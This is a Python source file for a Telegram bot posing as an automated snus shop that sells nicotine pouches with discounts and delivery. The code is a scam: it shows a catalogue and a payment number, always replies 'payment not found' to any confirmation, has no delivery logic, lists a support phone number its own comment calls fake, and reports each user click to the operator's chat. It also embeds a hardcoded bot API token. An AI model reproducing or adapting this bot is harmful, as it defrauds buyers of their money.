# CODED BY @OLDIESUGAR #

import telebot
import random


kb = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True) # клавиатура
kb.row('🚀Каталог') # кнопочки
kb.row('📦Активные доставки')
kb.row('💻Тех. Поддержка')
kb.row('🏙Доступные города')

po = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True) # клавиатура
po.row('✅ Подтвердить оплату') # кнопочки
po.row('❌ Отменить заказ')

tovar1 = ('Maxwells Orange (20мг) - 3̶5̶0̶₽ 199₽') # товар в каталоге
tovar2 = ('Corvus Logan (50мг) - 3̶9̶9̶₽ 249₽')
tovar3 = ('Cuba (60мг) - 2̶4̶9̶₽ 149₽')
tovar4 = ('Corvus Strong (32мг) - 3̶5̶0̶₽ 199₽')
tovar5 = ('Boshki Unicorn Milk (100мг) - 3̶5̶0̶₽ 199₽')
tovar6 = ('HOOK Mojito (40мг) - 3̶5̶0̶₽ 199₽')
tovar7 = ('Corvus Hulk (50мг) - 3̶5̶0̶₽ 199₽')
tovar8 = ('Cuba Watermelon (55мг) - 3̶5̶0̶₽ 199₽')
tovar9 = ('Cuba Power (55мг) - 3̶5̶0̶₽ 199₽')
tovar10 = ('Corvus Flash (50мг) - 3̶5̶0̶₽ 199₽')
tovar11 = ('Случайный снюс (50мг) - 100₽')
cenatovar1 = ('199₽')
cenatovar2 = ('249₽')
cenatovar3 = ('149₽')
cenatovar4 = ('199₽')
cenatovar5 = ('199₽')
cenatovar6 = ('199₽')
cenatovar7 = ('199₽')
cenatovar8 = ('199₽')
cenatovar9 = ('199₽')
cenatovar10 = ('199₽')
cenatovar11 = ('100₽')


kat = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True) # клавиатура
kat.row(tovar1) # кнопочки
kat.row(tovar2)
kat.row(tovar3)
kat.row(tovar4)
kat.row(tovar5)
kat.row(tovar6)
kat.row(tovar7)
kat.row(tovar8)
kat.row(tovar9)
kat.row(tovar10)
kat.row(tovar11)
kat.row('Вернуться')

op = ('@Snusim') # Ник телеграмма оператора
numb = ('+79714773285') # Фейк Номер телефона
oplata = ('+79647872316')
nomerplat1 = random.randint(11111, 99999)
nomerplat2 = random.randint(11111, 99999)
nomerplat3 = random.randint(11111, 99999)
nomerplat4 = random.randint(11111, 99999)

bot = telebot.TeleBot('931361754:AAE3ZTrvlIFFbnie-rqURv1AGBHuaZ1NTiw') # токен бота
@bot.message_handler(content_types=['text']) 


def handler_zz_gg(message):
    id = message.chat.id
    tx = message.text
    if tx == '/start':
        bot.send_message(428290116, 'Кто-то ввел /start')
        bot.send_message(id, 'Привет! Это бот АвтоПродаж снюса. \nПочему именно мы?\n1. Всё автоматическое, не надо ждать по 2-4 дня для проверки заявки\n3. Быстрая доставка\n4. Качество\n5. Скидки в честь окрытия', reply_markup=kb)
    elif tx == '🚀Каталог':
        bot.send_message(id, 'Весь каталог:', parse_mode='Markdown', reply_markup=kat)
        bot.send_message(428290116, 'Кто-то открыл каталог')
    elif tx == '🏙Доступные города':
        bot.send_message(428290116, 'Кто-то смотрит список городов')
        bot.send_message(id, '🇺🇦Украина: *Киев, Житомир, Одесса, Харьков, Днепро, Сумы.*\n🇷🇺Россия: *Доставка по всей России.*', parse_mode='Markdown', reply_markup=kb)
    elif tx == '📦Активные доставки':
        bot.send_message(428290116, 'Кто-то проверяет доставки')
        bot.send_message(id, '📦 Ваши активные доставки: *Тут пока пусто :<*', parse_mode='Markdown', reply_markup=kb)
    elif tx == 'Вернуться':
        bot.send_message(id, 'Вы вернулись на главную страницу', parse_mode='Markdown', reply_markup=kb)
    elif tx == '💻Тех. Поддержка':
        bot.send_message(428290116, 'Кто-то открыл тех.поддержку')
        bot.send_message(id, '✅ *Активный оператор* который сможет вам помочь в любой ситуации: '+op+' \nЕсли вам не смогли помочь онлайн, позвоните по этому номеру: '+numb, parse_mode='Markdown', reply_markup=kb)
    elif tx == tovar1:
        bot.send_message(428290116, f'Кто-то нажал на {tovar1}')
        bot.send_message(id, 'Товар: '+tovar1+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar1+'*\nНомер заказа, примечание к платежу: *'+str(nomerplat1)+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == tovar2:
        bot.send_message(428290116, f'Кто-то нажал на {tovar2}')
        bot.send_message(id, 'Товар: '+tovar2+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar2+'*\nНомер заказа, примечание к платежу: *'+str(nomerplat2)+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)    
    elif tx == tovar3:
        bot.send_message(428290116, f'Кто-то нажал на {tovar3}')
        bot.send_message(id, 'Товар: '+tovar3+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar3+'*\nНомер заказа, примечание к платежу: *'+str(nomerplat3)+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)    
    elif tx == tovar4:
        bot.send_message(428290116, f'Кто-то нажал на {tovar4}')
        bot.send_message(id, 'Товар: '+tovar4+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar4+'*\nНомер заказа, примечание к платежу: *'+str(nomerplat4)+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == '✅ Подтвердить оплату':
        bot.send_message(428290116, f'Кто-то нажал Подтвердить оплату')
        bot.send_message(id, '❌ Платёж *не найден* ❌', parse_mode='Markdown', reply_markup=po)
    elif tx == '❌ Отменить заказ':
        bot.send_message(428290116, f'Кто-то нажал отменить заказ')
        bot.send_message(id, '✅ Вы успешно *отменили* заказ', parse_mode='Markdown', reply_markup=kb)
    elif tx == tovar5:
        bot.send_message(428290116, f'Кто-то нажал на {tovar5}')
        bot.send_message(id, 'Товар: '+tovar5+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar5+'*\nНомер заказа, примечание к платежу: *'+str(random.randint(1111,9999))+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == tovar6:
        bot.send_message(428290116, f'Кто-то нажал на {tovar6}')
        bot.send_message(id, 'Товар: '+tovar6+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar6+'*\nНомер заказа, примечание к платежу: *'+str(random.randint(1111,9999))+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == tovar7:
        bot.send_message(428290116, f'Кто-то нажал на {tovar7}')
        bot.send_message(id, 'Товар: '+tovar7+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar7+'*\nНомер заказа, примечание к платежу: *'+str(random.randint(1111,9999))+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == tovar8:
        bot.send_message(428290116, f'Кто-то нажал на {tovar8}')
        bot.send_message(id, 'Товар: '+tovar8+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar8+'*\nНомер заказа, примечание к платежу: *'+str(random.randint(1111,9999))+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == tovar9:
        bot.send_message(428290116, f'Кто-то нажал на {tovar9}')
        bot.send_message(id, 'Товар: '+tovar9+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar9+'*\nНомер заказа, примечание к платежу: *'+str(random.randint(1111,9999))+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == tovar10:
        bot.send_message(428290116, f'Кто-то нажал на {tovar10}')
        bot.send_message(id, 'Товар: '+tovar10+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar10+'*\nНомер заказа, примечание к платежу: *'+str(random.randint(1111,9999))+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)
    elif tx == tovar11:
        bot.send_message(428290116, f'Кто-то нажал на {tovar11}')
        bot.send_message(id, 'Товар: '+tovar11+'\nОплатите ваш заказ по номеру: 🥝*'+oplata+'*\nСумма оплаты: *'+cenatovar11+'*\nНомер заказа, примечание к платежу: *'+str(random.randint(1111,9999))+'*\nПосле оплаты нажмите на кнопку "✅ Подтвердить оплату"\n\nКогда оплата произойдет успешно, свяжитесь с оператором, или же по номеру телефона: *'+op+'* *'+numb+'*', parse_mode='Markdown', reply_markup=po)


bot.polling()